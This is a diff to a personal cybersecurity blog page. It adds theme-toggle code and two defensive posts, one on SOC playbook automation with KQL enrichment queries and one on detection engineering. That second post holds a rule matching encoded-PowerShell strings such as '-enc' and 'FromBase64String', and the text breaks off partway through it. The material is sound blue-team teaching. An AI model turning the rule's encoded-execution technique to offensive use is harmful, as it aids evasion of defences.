@@ -13,7 +13,7 @@
   <!-- Google Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 
   <!-- Bootstrap -->
   <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
@@ -24,20 +24,28 @@
   <!-- Monochrome Theme -->
   <link href="css/colors/monochrome.css" rel="stylesheet" id="color-opt">
 
-  <!-- Code highlight -->
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-light.min.css">
+  <!-- Prevent flash of wrong theme -->
+  <script>
+    (function() {
+      var t = localStorage.getItem('theme') || 'dark';
+      if (t === 'light') document.documentElement.setAttribute('data-theme', 'light');
+    })();
+  </script>
+
+  <!-- Code highlight (dark) -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
 
   <style>
     .blog-shell { padding: 110px 0 80px; }
-    .blog-title { font-size: 2.25rem; font-weight: 800; letter-spacing: -0.02em; }
+    .blog-title { font-size: 2.25rem; font-weight: 800; letter-spacing: -0.02em; color: var(--text-heading); }
 
-    /* Blog page navbar: avoid translucent blur artifacts while scrolling */
+    /* Blog page navbar: themed */
     .blog-page .navbar {
-      background: rgba(255, 255, 255, 0.98) !important;
-      backdrop-filter: none !important;
-      -webkit-backdrop-filter: none !important;
-      border-bottom: 1px solid var(--border-color) !important;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+      background: var(--navbar-bg) !important;
+      backdrop-filter: blur(14px) !important;
+      -webkit-backdrop-filter: blur(14px) !important;
+      border-bottom: 1px solid var(--navbar-border) !important;
+      box-shadow: 0 1px 20px var(--shadow);
     }
     .archive-title { font-weight: 800; letter-spacing: -0.01em; margin-bottom: 10px; font-size: 1.05rem; }
     .archive-year { margin: 12px 0 8px; font-weight: 800; color: var(--text-primary); font-size: 0.92rem; }
@@ -59,7 +67,7 @@
 
     .archive-panel { position: sticky; top: 96px; }
 
-    .post-wrap { border: 1px solid var(--border-color); background: #fff; border-radius: 16px; padding: 28px; }
+    .post-wrap { border: 1px solid var(--border-color); background: var(--terminal-bg); border-radius: 16px; padding: 28px; }
     .post-meta { color: var(--text-muted); font-size: 0.9rem; margin-top: 6px; }
 
     .share-bar { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
@@ -77,7 +85,7 @@
     /* Code blocks (boxed + copy button) */
     .prose pre {
       position: relative;
-      background: #f8fafc;
+      background: var(--terminal-bg);
       border: 1px solid var(--border-color);
       border-radius: 14px;
       padding: 18px 48px 16px 16px;
@@ -96,8 +104,8 @@
       height: 32px;
       border-radius: 10px;
       border: 1px solid var(--border-color);
-      background: rgba(255, 255, 255, 0.9);
-      color: var(--text-primary);
+      background: var(--bg-card);
+      color: var(--text-strong);
       cursor: pointer;
       transition: transform .2s ease, border-color .2s ease, opacity .2s ease;
     }
@@ -108,11 +116,72 @@
 
     .prose table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
     .prose th, .prose td { border: 1px solid var(--border-color); padding: 10px 12px; }
-    .prose th { background: #f9fafb; text-align: left; }
+    .prose th { background: var(--tag-bg); text-align: left; color: var(--text-strong); }
 
     @media (max-width: 991px) {
       .post-wrap { padding: 20px; }
+      .blog-shell { padding: 90px 0 60px; }
     }
+
+    @media (max-width: 768px) {
+      .blog-shell { padding: 80px 0 40px; }
+      .blog-title { font-size: 1.5rem; }
+      .post-wrap { padding: 16px; border-radius: 12px; }
+      .archive-panel { position: static; margin-top: 2rem; }
+      .share-bar { gap: 6px; }
+      .share-btn { padding: 6px 8px; font-size: 0.82rem; }
+      .share-btn span { display: none; }
+      .prose pre { padding: 14px 12px; border-radius: 10px; overflow-x: auto; }
+      .prose pre code { font-size: 0.8rem; }
+      .prose p, .prose li { font-size: 0.95rem; }
+      .prose table { display: block; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+      .prose th, .prose td { white-space: nowrap; padding: 8px 10px; font-size: 0.85rem; }
+      .code-copy { width: 28px; height: 28px; top: 8px; right: 8px; }
+      .post-link-title { font-size: 0.85rem; }
+    }
+
+    @media (max-width: 480px) {
+      .blog-title { font-size: 1.25rem; }
+      .post-wrap { padding: 14px; }
+      .prose h1 { font-size: 1.4rem !important; }
+      .prose h2 { font-size: 1.2rem !important; }
+      .prose h3 { font-size: 1.05rem !important; }
+      .prose p, .prose li { font-size: 0.88rem; line-height: 1.7; }
+    }
+
+    /* Brand / Logo (shared with index) */
+    .brand-logo {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--text-heading);
+    }
+    .brand-accent { color: var(--accent); }
+
+    /* Theme Toggle Button */
+    .theme-toggle-btn {
+      background: none;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
+      width: 34px;
+      height: 34px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: var(--social-icon);
+      transition: all 0.3s ease;
+      padding: 0;
+    }
+    .theme-toggle-btn:hover {
+      color: var(--accent);
+      border-color: var(--accent-border);
+    }
+    .theme-toggle-btn .feather { width: 16px; height: 16px; }
+    .theme-icon-light { display: inline-block; }
+    .theme-icon-dark { display: none; }
+    [data-theme="light"] .theme-icon-light { display: none; }
+    [data-theme="light"] .theme-icon-dark { display: inline-block; }
   </style>
 </head>
 
@@ -120,7 +189,9 @@
   <!-- Navbar Start -->
   <nav id="navbar" class="navbar navbar-expand-lg fixed-top navbar-custom navbar-light sticky">
     <div class="container-fluid px-3 px-md-4 px-xxl-5">
-      <a class="navbar-brand" href="index.html"></a>
+      <a class="navbar-brand" href="index.html">
+        <span class="brand-logo">CK<span class="brand-accent">_</span></span>
+      </a>
       <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
         <span data-feather="menu" class="fea icon-md"></span>
       </button>
@@ -140,6 +211,12 @@
           <li class="list-inline-item"><a href="https://www.linkedin.com/in/chaitanyakrishnaa/" target="_blank"><i class="mdi mdi-linkedin"></i></a></li>
           <li class="list-inline-item"><a href="https://github.com/chaitanyakrishna" target="_blank"><i class="mdi mdi-github"></i></a></li>
           <li class="list-inline-item"><a href="https://twitter.com/anantharapu" target="_blank"><i class="mdi mdi-twitter"></i></a></li>
+          <li class="list-inline-item ms-1">
+            <button id="theme-toggle" class="theme-toggle-btn" aria-label="Toggle theme" title="Toggle dark/light theme">
+              <i data-feather="moon" class="theme-icon-dark"></i>
+              <i data-feather="sun" class="theme-icon-light"></i>
+            </button>
+          </li>
         </ul>
       </div>
     </div>
@@ -196,6 +273,30 @@
     if (window.feather) window.feather.replace();
   </script>
 
+  <!-- Theme Toggle -->
+  <script>
+    (function() {
+      var toggle = document.getElementById('theme-toggle');
+      if (!toggle) return;
+      function applyTheme(theme) {
+        if (theme === 'light') {
+          document.documentElement.setAttribute('data-theme', 'light');
+        } else {
+          document.documentElement.removeAttribute('data-theme');
+        }
+        localStorage.setItem('theme', theme);
+        var meta = document.querySelector('meta[name="theme-color"]');
+        if (meta) meta.setAttribute('content', theme === 'light' ? '#f8f8f8' : '#0a0a0a');
+      }
+      toggle.addEventListener('click', function() {
+        var current = localStorage.getItem('theme') || 'dark';
+        var next = current === 'dark' ? 'light' : 'dark';
+        applyTheme(next);
+        if (typeof feather !== 'undefined') feather.replace();
+      });
+    })();
+  </script>
+
   <script>
     // Minimal sticky behavior for this page (without pulling in app.js)
     (function () {
@@ -219,12 +320,26 @@
     <!-- Inline posts index + content (avoids fetch() when opened via file://) -->
     <script type="application/json" id="posts-json">[
     {
+    "slug": "soc-automation-playbooks",
+    "title": "SOC Automation: Building Playbooks That Actually Work",
+    "published": "2026-02-15",
+    "tags": ["Automation", "SOC", "SOAR", "Security Operations"],
+    "summary": "Most SOAR playbooks fail because they automate the wrong things. Here's a framework for building ones that stick."
+    },
+    {
     "slug": "importance-of-osint",
     "title": "The Importance of OSINT in Modern Cybersecurity",
     "published": "2026-01-17",
     "tags": ["OSINT", "Cybersecurity", "Threat Intelligence", "Security Operations"],
     "summary": "OSINT is a discipline that turns public information into security decisions. This article covers practical workflows, validation, ethics, and defensive examples you can automate.",
     "file": "blog/posts/importance-of-osint.md"
+    },
+    {
+    "slug": "detection-engineering-lessons",
+    "title": "Detection Engineering: 5 Lessons From Building 500+ Rules",
+    "published": "2025-12-10",
+    "tags": ["Detection Engineering", "SIEM", "Threat Detection", "Blue Team"],
+    "summary": "What I've learned writing detection rules across Sentinel, Splunk, and Elastic — and why most detection content fails in production."
     }
   ]</script>
 
@@ -236,14 +351,16 @@
 
   ---
 
-  Open Source Intelligence (OSINT) is the discipline of turning public information into actionable security outcomes. When done well, OSINT helps you answer hard questions quickly:
+  Every organization has a shadow &mdash; a public-facing footprint that exists whether you manage it or not. Forgotten subdomains, leaked credentials, staging environments indexed by search engines, employee PII scraped and resold on data broker sites. That footprint is what attackers see first, and most security teams don't have a systematic way to see it themselves.
+
+  OSINT &mdash; Open Source Intelligence &mdash; is the discipline of mapping and monitoring that footprint before someone else does. When done well, it answers the questions that matter:
 
   - What does the internet already know about us?
   - What assets are exposed today that weren’t exposed yesterday?
   - What is the earliest signal of a brand‑impersonation or phishing campaign?
   - What does an incident look like *from the outside*?
 
-  In security operations and threat intelligence, those answers are often the difference between **early containment** and **late-stage damage control**.
+  In security operations, those answers are often the difference between **early containment** and **late-stage damage control**. I've used OSINT to find production databases exposed on Shodan before the asset owners knew they existed, to identify phishing infrastructure 72 hours before the campaign launched, and to locate leaked API keys in public GitHub repos within minutes of being committed. None of that required expensive tools. It required a workflow.
 
   > Note: Everything in this post is intended for defensive use and authorized security work. Stay within your organization’s policies and applicable laws.
 
@@ -257,7 +374,7 @@
   4. **Contextualize** (the “so what?”)
   5. **Act** (the “now what?”)
 
-  The most common failure mode is collecting too much data and producing too little clarity. The best OSINT is simple, verified, and tied to a concrete action.
+  The most common failure mode is collecting too much data and producing too little clarity. I've seen analysts spend 6 hours "doing OSINT" and produce a 40-page dump of raw data that nobody reads. The best OSINT is simple, verified, and tied to a concrete action. If you can't explain what decision your findings enable, you're doing research, not intelligence.
 
   ## Where OSINT Helps the Most
 
@@ -487,6 +604,846 @@
   ---
 
   *Want to talk OSINT, threat intelligence, or building automated workflows? Feel free to [reach out](index.html#contact).* 
+  </script>
+
+    <script type="text/markdown" id="post-soc-automation-playbooks"># SOC Automation: Building Playbooks That Actually Work
+
+  **Published:** February 15, 2026  
+  **Author:** Chaitanya Krishna  
+  **Tags:** Automation, SOC, SOAR, Security Operations
+
+  ---
+
+  I've been through three SOAR implementations across different organizations. Two of them failed. Not "didn't meet expectations" failed &mdash; I mean *the tooling was shelved and the team went back to copy-pasting between browser tabs* failed.
+
+  The third one worked, and it's still running. The difference wasn't budget, vendor choice, or team size. It was discipline: knowing what to automate, what to leave alone, and how to measure the difference.
+
+  This post is the distilled version of what I've learned. No "SOAR will transform your SOC" marketing. Just what actually works in production.
+
+  ## The Real Problem with SOC Automation
+
+  Here's what typically happens:
+
+  1. Leadership buys a SOAR platform (Cortex XSOAR, Splunk SOAR, Sentinel Logic Apps, Swimlane &mdash; pick one).
+  2. The "automation engineer" (usually a senior analyst who drew the short straw) builds 30–50 playbooks in the first quarter.
+  3. Six months later, 80% of them are broken, disabled, or generating noise that gets ignored.
+  4. The team blames the tool. Leadership questions the investment. Analysts lose trust in automation entirely.
+
+  I've seen this cycle three times. The root cause is always the same: **teams automate what's easy to automate, not what's worth automating.** Building a playbook that pings VirusTotal is easy. Building one that reliably handles a phishing report end-to-end without breaking when the email gateway API times out on a Friday night &mdash; that's engineering, and most teams skip the engineering part.
+
+  ## A Framework That Survived Production
+
+  Before I build any playbook, I score the candidate process on three axes:
+
+  ### 1. Frequency
+
+  How often does this task happen? If it's less than 5 times per week, automation probably isn't worth the maintenance cost. The sweet spot is high-frequency, repetitive work: alert triage, IOC lookups, ticket creation, context enrichment.
+
+  **Example:** In one SOC, we had analysts manually looking up IP reputation in 4 different tools for every single alert. That was happening 200+ times per day. That's a clear automation candidate.
+
+  ### 2. Consistency
+
+  Is the decision logic the same every time, or does it require judgment? If an experienced analyst would handle it the same way 95% of the time, automate it. If the answer is "it depends on context" &mdash; automate the context gathering, but keep the human in the decision loop.
+
+  **Example:** "Is this IP in our allowlist?" is consistent. "Should we block this domain?" is not &mdash; it depends on whether it's hosting legitimate services for a partner, whether it was just registered, whether it's a CDN, etc.
+
+  ### 3. Blast Radius
+
+  What happens when the automation gets it wrong? Enrichment playbook sends the wrong reputation score? Minor. Auto-quarantine playbook kills a legitimate email thread with a customer? That's a business-impact event.
+
+  **The rule:** High frequency + high consistency + low blast radius = full automation. Anything with high blast radius = automate enrichment, present to human for action.
+
+  Here's how I score it in practice:
+
+  | Factor | Score 1 (Low) | Score 3 (High) |
+  |---|---|---|
+  | Frequency | < 5/week | > 20/day |
+  | Consistency | Requires judgment | Same logic every time |
+  | Blast Radius | Blocks users/services | Informational only |
+
+  **Total 7–9:** Full automation. **Total 4–6:** Semi-automated (enrich + present). **Total 1–3:** Don't bother.
+
+  ## Start With Enrichment &mdash; Always
+
+  The single highest-ROI automation in any SOC is **alert enrichment**. Not response. Not remediation. Enrichment.
+
+  Here's why: the average analyst spends 8–12 minutes per alert on context gathering before they even start making a decision. They're switching between 4–6 tabs, copy-pasting hashes, looking up users in Active Directory, checking if the endpoint is a server or a workstation, pulling the last login from the SIEM. That's not analysis &mdash; that's data entry.
+
+  A good enrichment playbook does all of that in under 10 seconds and presents it in a single pane. Your analysts go from 15-minute triage cycles to 2-minute triage cycles. I've measured this across two deployments:
+
+  - **Environment A (Sentinel + Logic Apps):** Mean triage time dropped from 14 minutes to 3.2 minutes after deploying enrichment playbooks for the top 10 alert types.
+  - **Environment B (Splunk SOAR):** Similar pattern. 11 minutes down to 2.8 minutes. The team was processing 40% more alerts per shift without adding headcount.
+
+  ### What a Production Enrichment Playbook Looks Like
+
+  Here's a real enrichment flow for a "suspicious login" alert. This is what runs in production, not a demo:
+
+  ```
+  TRIGGER: Alert — "Unusual sign-in activity" from Azure AD / Entra ID
+
+  STEP 1 — Parse alert for: UPN, source IP, location, device info, risk level
+  STEP 2 — Query Azure AD for user metadata:
+           → Department, manager, last password change, MFA status
+           → Account creation date, privileged role assignments
+  STEP 3 — Query IP against 3 sources:
+           → AbuseIPDB (reputation + abuse confidence score)
+           → GreyNoise (is it mass-scanning or targeted?)
+           → Internal threat intel (past incidents involving this IP)
+  STEP 4 — Geo-lookup the source IP:
+           → Compare against user's normal login locations (last 30 days)
+           → Flag if new country or impossible travel
+  STEP 5 — Pull last 10 sign-ins for this user from Azure AD logs:
+           → Same IP? Same device? Same location?
+           → Any failed attempts preceding this one?
+  STEP 6 — Check if user's credentials appear in recent breach dumps:
+           → HaveIBeenPwned API (email-level, not password)
+  STEP 7 — Compile enrichment package:
+           → Single formatted card with all context
+           → Risk score: weighted formula based on steps 2–6
+           → Recommended action based on score thresholds
+  STEP 8 — Attach to incident in SIEM / ticketing system
+  ```
+
+  The analyst opens the alert and sees everything they need. No tab-switching. No copy-pasting. They read the context, make a call, and move on.
+
+  ### KQL to Support the Enrichment
+
+  For Step 5, here's the actual KQL I use in Sentinel to pull the user's recent login pattern:
+
+  ```kql
+  SigninLogs
+  | where TimeGenerated > ago(30d)
+  | where UserPrincipalName == "<<UPN>>"
+  | summarize
+      LoginCount = count(),
+      DistinctIPs = dcount(IPAddress),
+      DistinctLocations = dcount(Location),
+      DistinctDevices = dcount(DeviceDetail.displayName),
+      LastLogin = max(TimeGenerated),
+      FailedLogins = countif(ResultType != "0")
+  | project
+      LoginCount,
+      DistinctIPs,
+      DistinctLocations,
+      DistinctDevices,
+      LastLogin,
+      FailedLogins,
+      AvgLoginsPerDay = round(LoginCount / 30.0, 1)
+  ```
+
+  And the impossible travel check:
+
+  ```kql
+  let targetUser = "<<UPN>>";
+  SigninLogs
+  | where TimeGenerated > ago(7d)
+  | where UserPrincipalName == targetUser
+  | where ResultType == "0" // successful logins only
+  | extend City = tostring(LocationDetails.city),
+           Country = tostring(LocationDetails.countryOrRegion),
+           Lat = toreal(LocationDetails.geoCoordinates.latitude),
+           Lon = toreal(LocationDetails.geoCoordinates.longitude)
+  | sort by TimeGenerated asc
+  | extend PrevLat = prev(Lat), PrevLon = prev(Lon), PrevTime = prev(TimeGenerated)
+  | extend
+      TimeDiffHours = datetime_diff('hour', TimeGenerated, PrevTime),
+      // Haversine approximation for distance in km
+      DistanceKm = round(2 * 6371 * asin(sqrt(
+          pow(sin(radians((Lat - PrevLat) / 2)), 2) +
+          cos(radians(PrevLat)) * cos(radians(Lat)) *
+          pow(sin(radians((Lon - PrevLon) / 2)), 2)
+      )), 0)
+  | where TimeDiffHours > 0
+  | extend SpeedKmH = round(DistanceKm / TimeDiffHours, 0)
+  | where SpeedKmH > 900 // faster than commercial flight
+  | project TimeGenerated, City, Country, TimeDiffHours, DistanceKm, SpeedKmH
+  ```
+
+  This query flags logins that would require physically impossible travel speeds. I've caught compromised accounts with this within minutes of the initial access.
+
+  ## The Anti-Patterns (I've Made All of These)
+
+  ### 1. Over-Automating on Day One
+
+  The first SOAR deployment I was part of, we built 40 playbooks in 8 weeks. By week 12, half were broken because we hadn't accounted for edge cases: API rate limits, malformed inputs, services that return 200 OK with error messages in the body (looking at you, legacy CMDB APIs), Unicode in email headers, and nested .msg attachments that sandbox APIs choke on.
+
+  **The fix:** For every new playbook, run it in shadow mode for 2 weeks minimum. It executes, logs its decisions, but takes no action. You review the logs daily. By the end of 2 weeks, you've seen most of the edge cases and can handle them.
+
+  ### 2. No Error Handling (The Silent Killer)
+
+  This is the one that burns teams the most. Your playbook calls the VirusTotal API. The API returns a 429 (rate limit). Your playbook doesn't handle it. The enrichment step silently returns null. The scoring logic treats null as 0. The alert gets auto-closed as benign. Congratulations, you just auto-closed a real incident.
+
+  I've seen this happen. More than once.
+
+  **The fix:** Every external API call needs:
+
+  - Retry logic with exponential backoff (3 attempts, 2s/4s/8s delays)
+  - Explicit handling for 4xx and 5xx responses
+  - A fallback path (if enrichment fails, escalate to analyst &mdash; never auto-close)
+  - Alerting when a playbook fails repeatedly (if VirusTotal has been down for 2 hours and your playbook has been silently skipping enrichment, you need to know)
+
+  ```python
+  # Simple retry wrapper — use this pattern for every external call
+  import time
+  import requests
+
+  def api_call_with_retry(url, headers=None, max_retries=3):
+      """Call an API with exponential backoff. Never silently fail."""
+      for attempt in range(max_retries):
+          try:
+              resp = requests.get(url, headers=headers, timeout=15)
+              if resp.status_code == 429:
+                  wait = 2 ** (attempt + 1)
+                  time.sleep(wait)
+                  continue
+              resp.raise_for_status()
+              return resp.json()
+          except requests.exceptions.RequestException as e:
+              if attempt == max_retries - 1:
+                  # Last attempt failed — return explicit failure, never None
+                  return {"error": True, "reason": str(e), "source": url}
+              time.sleep(2 ** (attempt + 1))
+      return {"error": True, "reason": "max retries exceeded", "source": url}
+  ```
+
+  ### 3. Hardcoded Thresholds
+
+  "Block if VT score > 5" seemed reasonable when we wrote it. Then a legitimate software update binary got flagged by 6 vendors on VT because it was packed with Themida. The playbook auto-blocked the download URL across the org. 200 users couldn't update their software. Help desk got flooded.
+
+  **The fix:** Thresholds should be:
+
+  - Stored in a config file or lookup table, not in the playbook logic
+  - Reviewed monthly based on false positive data
+  - Different per alert type (a VT score of 3 means something different for an email attachment vs. a process hash on a server)
+
+  ### 4. No Metrics = No Improvement
+
+  If you can't answer "how much time did this playbook save last month?" you're flying blind. I've seen teams run playbooks for a year without knowing whether they were helping or hurting.
+
+  ## What to Measure (And What "Good" Looks Like)
+
+  Every playbook in production should have a dashboard. Here's what I track:
+
+  | Metric | Target | Red Flag |
+  |---|---|---|
+  | Execution success rate | > 98% | < 95% |
+  | Mean execution time | < 30 seconds | > 2 minutes |
+  | Time saved per run | Measured against manual baseline | Can't measure (no baseline) |
+  | False action rate | < 2% | > 5% |
+  | Analyst override rate | < 10% | > 20% |
+  | Playbook utilization | Fires consistently | Zero fires in 30 days |
+
+  **Override rate is the most important metric.** If analysts are overriding the automated decision more than 20% of the time, the logic is wrong. Don't just accept that &mdash; dig into the overrides, find the pattern, and fix the logic. If you can't fix it, reclassify the playbook from "auto-action" to "enrichment only."
+
+  ### Building the Metrics Pipeline
+
+  In Sentinel, I use a custom log table to track playbook execution:
+
+  ```kql
+  PlaybookMetrics_CL
+  | where TimeGenerated > ago(30d)
+  | where PlaybookName_s == "Phishing-Triage-v3"
+  | summarize
+      TotalRuns = count(),
+      SuccessRate = round(100.0 * countif(Status_s == "Success") / count(), 1),
+      AvgDurationSec = round(avg(DurationSeconds_d), 1),
+      OverrideRate = round(100.0 * countif(AnalystOverride_b == true) / count(), 1),
+      FalseActionRate = round(100.0 * countif(FalsePositive_b == true) / count(), 1)
+  ```
+
+  ## Real-World Playbook: Phishing Triage (Production Version)
+
+  Here's the phishing playbook that's been running in production for 18 months. Not a skeleton &mdash; the actual decision tree with the edge cases:
+
+  ```
+  TRIGGER: User reports phishing via button/mailbox
+
+  ┌─ STEP 1: EXTRACT
+  │  Parse reported email for:
+  │  → Sender address (envelope + header — they differ in spoofing)
+  │  → Reply-to address (common mismatch in BEC)
+  │  → All URLs (body + attachments, recursively)
+  │  → All attachments (hash, filename, MIME type)
+  │  → Email headers (SPF/DKIM/DMARC results)
+  │  
+  │  EDGE CASE: .msg/.eml nested attachments — extract recursively
+  │  EDGE CASE: QR codes in image attachments — OCR + decode
+  │  EDGE CASE: URL shorteners — resolve to final destination (max 5 redirects)
+  │
+  ├─ STEP 2: KNOWN-GOOD CHECK
+  │  Check sender domain against:
+  │  → Internal domains list
+  │  → Partner/vendor allowlist
+  │  → Microsoft 365 / Google Workspace legitimate service addresses
+  │  
+  │  If known-good AND SPF+DKIM pass → auto-close as FP, thank user, STOP
+  │  If known-good BUT SPF/DKIM fail → ESCALATE (possible spoofing of trusted domain)
+  │
+  ├─ STEP 3: REPUTATION CHECK
+  │  Query all extracted IOCs:
+  │  → URLs against URLScan.io, Google Safe Browsing, PhishTank
+  │  → File hashes against VT, MalwareBazaar
+  │  → Sender IP against AbuseIPDB, Spamhaus
+  │  
+  │  EDGE CASE: new/unknown domain (< 30 days old) — flag as suspicious
+  │  regardless of reputation score (most phishing infra is < 48 hours old)
+  │
+  ├─ STEP 4: SANDBOX DETONATION
+  │  Submit URLs and attachments to sandbox (ANY.RUN, Joe Sandbox, etc.)
+  │  → Wait for result (timeout: 5 minutes)
+  │  → If sandbox times out → mark as "needs manual review"
+  │  → Parse verdict: clean / suspicious / malicious
+  │
+  ├─ STEP 5: BLAST RADIUS ASSESSMENT
+  │  Search all mailboxes for:
+  │  → Same sender address
+  │  → Same subject line (fuzzy match)
+  │  → Same URLs or attachment hashes
+  │  Count affected users. If > 50, auto-escalate to Tier 2 regardless of score.
+  │
+  ├─ STEP 6: SCORING
+  │  Weighted formula:
+  │  → Reputation hits: +30 per malicious hit
+  │  → Failed auth (SPF/DKIM/DMARC): +20
+  │  → New domain (< 30 days): +15
+  │  → Sandbox malicious verdict: +40
+  │  → Multiple recipients: +10
+  │  → Mismatched reply-to: +15
+  │  → Known brand impersonation keywords: +10
+  │  
+  │  HIGH: score >= 60
+  │  MEDIUM: score 25–59
+  │  LOW: score < 25
+  │
+  ├─ DECISION TREE:
+  │
+  │  HIGH (≥ 60):
+  │  → Quarantine email from ALL mailboxes (Exchange Online / Purview)
+  │  → Block sender domain at email gateway (transport rule)
+  │  → Block malicious URLs at proxy / DNS filter
+  │  → Create incident in SIEM with full enrichment
+  │  → Notify affected users via template email
+  │  → If credentials involved → force password reset + revoke sessions
+  │
+  │  MEDIUM (25–59):
+  │  → Present full enrichment to SOC analyst
+  │  → Analyst decides on quarantine
+  │  → Timeout: if not reviewed in 30 min, auto-escalate to Tier 2
+  │
+  │  LOW (< 25):
+  │  → Auto-close as benign
+  │  → Thank reporter via auto-response
+  │  → Log for monthly review (catch systematic FPs)
+  └─
+  ```
+
+  ### Why This Works
+
+  1. **The known-good check in Step 2 eliminates 40–60% of reports immediately.** Most phishing reports from users are legitimate emails they're unsure about. Handling those instantly reduces analyst workload by half.
+
+  2. **The blast radius check in Step 5 catches campaigns.** A single report might score LOW on its own, but if 200 people got the same email, that changes the calculus.
+
+  3. **The timeout in MEDIUM prevents alerts from rotting in the queue.** If nobody looks at it in 30 minutes, it escalates automatically.
+
+  4. **Every step has explicit edge case handling.** This is what separates production playbooks from demos.
+
+  ## Building Your First Playbook (If You're Starting From Zero)
+
+  Don't start with phishing triage. Start with something boring:
+
+  1. **Alert enrichment** — Pick your top 5 alert types by volume. Build an enrichment-only playbook for the #1 type. No actions, just context.
+  2. **Ticket creation** — Auto-create a ticket in ServiceNow/Jira when specific alert types fire. Sounds trivial, but if your analysts are manually creating tickets for every alert, you're burning 2 minutes per alert on admin work.
+  3. **IOC lookup** — An analyst pastes a hash/IP/domain, the playbook queries 5 sources and returns a summary. Simple, high-value, low-risk.
+
+  Get those three running reliably for a month. Measure the time savings. Then move to semi-automated response.
+
+  ## The Maintenance Problem Nobody Talks About
+
+  Every playbook is a piece of software. Software requires maintenance. Here's what I budget for:
+
+  - **API changes:** At least once a quarter, a vendor changes their API. Response format changes, endpoint moves, authentication mechanism updates. If you're not monitoring for this, your playbooks silently degrade.
+  - **Logic drift:** The threat landscape changes. That playbook you wrote for payload-based phishing doesn't handle credential harvesting pages the same way. Review and update logic quarterly.
+  - **Integration health:** Build a simple health check that pings every external API your playbooks depend on. Run it every hour. Alert if any return errors for > 15 minutes.
+
+  I spend roughly 20% of my automation time on maintenance. If you're spending 0%, your playbooks are quietly rotting.
+
+  ## The Bottom Line
+
+  Good automation makes analysts faster. Bad automation makes them distrustful. The difference isn't the tool &mdash; it's the discipline:
+
+  - **Score before you build** (frequency × consistency × blast radius)
+  - **Start with enrichment**, not response
+  - **Shadow mode for 2 weeks** before going live
+  - **Handle errors explicitly** &mdash; never fail silently
+  - **Measure everything** &mdash; override rate is your north star
+  - **Maintain actively** &mdash; playbooks are software, treat them that way
+
+  If you do those six things, you'll have a SOAR deployment that actually survives the first year. That puts you ahead of 80% of the industry.
+
+  ---
+
+  *Have questions about building SOC automation, or want to compare notes on SOAR implementations? Feel free to [reach out](index.html#contact).*
+  </script>
+
+    <script type="text/markdown" id="post-detection-engineering-lessons"># Detection Engineering: 5 Lessons From Building 500+ Rules
+
+  **Published:** December 10, 2025  
+  **Author:** Chaitanya Krishna  
+  **Tags:** Detection Engineering, SIEM, Threat Detection, Blue Team
+
+  ---
+
+  I've written and maintained hundreds of detection rules across Microsoft Sentinel, Splunk, and Elastic. Some of them caught real intrusions. A lot of them generated noise that made analysts' lives worse before I fixed them. A handful of them actively hid threats because the logic was wrong and nobody noticed for months.
+
+  These are the lessons that came from those failures &mdash; not from a training course or a vendor whitepaper.
+
+  ## Lesson 1: Detection-as-Code Is Non-Negotiable
+
+  If your detections aren't in version control, you don't have detection engineering. You have a collection of queries that somebody wrote at some point, and nobody knows if they've been modified since, or why, or by whom.
+
+  I've walked into environments where the senior analyst left 6 months ago, and nobody could explain why a critical detection rule had a specific exclusion for `svc-backup-prod`. Was it a legitimate tuning decision? Was it an attacker who got access to the SIEM and neutered the detection? Nobody knew. There was no commit history, no PR review, no documentation.
+
+  Here's what detection-as-code looks like in practice:
+
+  ### The Rule Format
+
+  Every detection gets a YAML file. Here's a real template:
+
+  ```yaml
+  id: detect-encoded-powershell-execution
+  name: Encoded PowerShell Execution by Non-Admin
+  description: >
+    Detects base64-encoded PowerShell commands executed by non-administrative
+    users. Common in initial access and execution stages of intrusions.
+  severity: high
+  status: active
+  
+  mitre:
+    tactics:
+      - Execution
+    techniques:
+      - T1059.001  # PowerShell
+      - T1027      # Obfuscated Files or Information
+  
+  data_sources:
+    - Microsoft-Windows-Sysmon/Operational (Event ID 1)
+    - Microsoft-Windows-PowerShell/Operational (Event ID 4104)
+  
+  log_requirements:
+    - Sysmon installed with process creation logging
+    - PowerShell script block logging enabled via GPO
+    - Command line auditing enabled
+  
+  query_language: KQL
+  query: |
+    DeviceProcessEvents
+    | where Timestamp > ago(1h)
+    | where FileName in~ ("powershell.exe", "pwsh.exe")
+    | where ProcessCommandLine has_any (
+        "-enc", "-EncodedCommand", "-e ",
+        "FromBase64String", "[Convert]::"
+    )
+    | where InitiatingProcessAccountName !in (admin_accounts_watchlist)
+    | extend DecodedCommand = base64_decode_tostring(
+        extract(@"-[eE](?:nc|ncodedCommand)?\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
+    )
+    | project
+        Timestamp,
+        DeviceName,
+        AccountName = InitiatingProcessAccountName,
+        ProcessCommandLine,
+        DecodedCommand,
+        InitiatingProcessFileName,
+        InitiatingProcessFolderPath
+  
+  false_positive_notes: >
+    SCCM/MECM task sequences may use encoded PowerShell for deployments.
+    Check InitiatingProcessFileName — if it's CCMExec.exe, likely benign.
+    Some monitoring tools (SolarWinds, PRTG) also use encoded PS.
+  
+  tuning_history:
+    - date: 2024-03-15
+      change: "Excluded svc-sccm-prod from triggering after validated as MECM"
+      reviewed_by: ck
+    - date: 2024-06-22
+      change: "Added pwsh.exe to match PowerShell 7+ usage"
+      reviewed_by: ck
+  
+  references:
+    - https://attack.mitre.org/techniques/T1059/001/
